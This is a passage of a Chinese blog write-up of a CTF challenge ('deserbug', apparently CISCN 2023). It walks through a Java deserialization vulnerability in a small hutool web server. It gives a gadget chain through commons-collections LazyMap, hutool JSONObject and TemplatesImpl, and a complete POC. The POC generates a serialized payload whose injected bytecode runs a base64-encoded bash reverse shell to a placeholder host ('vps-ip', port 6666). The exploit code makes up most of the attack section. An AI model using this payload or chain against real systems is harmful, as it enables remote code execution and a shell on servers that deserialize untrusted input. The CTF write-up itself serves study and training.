+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">  <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">  <span class="keyword">private</span> Class targetclass;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">public</span> String anyexcept;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_">getTargetclass</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetclass</span><span class="params">(Class targetclass)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.targetclass = targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Object[] getTypearg() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypearg</span><span class="params">(Object[] typearg)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.typearg = typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">    <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnyexcept</span><span class="params">(String anyexcept)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.anyexcept = anyexcept;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Class[] getTypeparam() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypeparam</span><span class="params">(Class[] typeparam)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.typeparam = typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Testapp.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.ContentType;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerRequest;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testapp</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    HttpUtil.createServer(<span class="number">8888</span>)</span><br><span class="line">      .addAction(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">bugstr</span> <span class="operator">=</span> request.getParam(<span class="string">&quot;bugstr&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> (bugstr == <span class="literal">null</span>)</span><br><span class="line">            response.write(<span class="string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString()); </span><br><span class="line">          <span class="keyword">try</span> &#123;	<span class="comment">// base64解码转化为对象流后直接进行了readObject</span></span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line">            result = object.toString();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">            myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">            myexpect.setTypearg((Object[])<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; e.toString() &#125;);</span><br><span class="line">            myexpect.setTargetclass(e.getClass());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              result = myexpect.getAnyexcept().toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">              result = ex.toString();</span><br><span class="line">            &#125; </span><br><span class="line">          &#125; </span><br><span class="line">          response.write(result, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">        &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>getAnyexcept()</code>方法中存在类实例化的条件，这与某条CC链中，要使用<code>InstantiateTransformer#transform</code>中的代码类似，再看Web页面接收<code>bugstr</code>参数，经过base64解码转化为对象流后直接进行了<code>readObject</code>进行反序列化，因此这里肯定是要通过<code>CC链+getAnyexcept()</code>来触发漏洞</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240402100901230.png" alt="image-20240402100901230"></p>
+<p>提示：<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p>
+<p>通过<code>hutools.put</code>返回能够触发<code>getAnyexcept</code>，通过这里就可以串起<code>CC</code>链子，<code>getAnyexcept</code>实例化<code>TrAXFilter</code>，接而触发<code>templates</code>加载字节码触发RCE</p>
+<p><code>LazyMap</code>中，<code>LazyMap#get</code>是可以触发<code>map.put</code> 方法从而触发<code>cn.hutool.json.JSONObject.put</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()-&gt;HashMap#hash()-&gt;TiedMapEntry#hashCode()-&gt;TiedMapEntry#getValue()-&gt;LazyMap#get()-&gt;cn.hutool.json.JSONObject.put()-&gt;Myexpect#getAnyexcept()-&gt;TrAXFilter#constructor()-&gt;TemplatesImpl#newTransformer()-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getTemplates();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexpect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span>  <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject, transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap , <span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iConstant&quot;</span>, myexpect);</span><br><span class="line">        <span class="type">byte</span>[] serbyte =serialize(hashMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serbyte));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">template</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Chiikawa&quot;</span>);</span><br><span class="line">        template.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMtaXAvNjY2NiAwPiYgMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;)\&quot;)&quot;</span>;</span><br><span class="line">        template.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> template.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>URL编码下</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240328093825290.png" alt="image-20240328093825290"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240328093707725.png" alt="image-20240328093707725"></p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/01/29/pentest/web-pentest/SSRF/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/12/12/vuln/2016 Shiro 1.2.4反序列化漏洞/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Writeup/">Writeup<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#2023CISCN%E5%88%9D%E8%B5%9B"><span class="toc-article-text">2023CISCN初赛</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Unzip"><span class="toc-article-text">Unzip</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#BackendService"><span class="toc-article-text">BackendService</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">nacos身份认证漏洞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Nacos%E7%BB%93%E5%90%88Spring-Cloud-Gateway-RCE%E5%88%A9%E7%94%A8"><span class="toc-article-text">Nacos结合Spring Cloud Gateway RCE利用</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#go-session"><span class="toc-article-text">go_session</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-article-text">代码审计</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-article-text">复现过程</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#deserbug"><span class="toc-article-text">deserbug</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
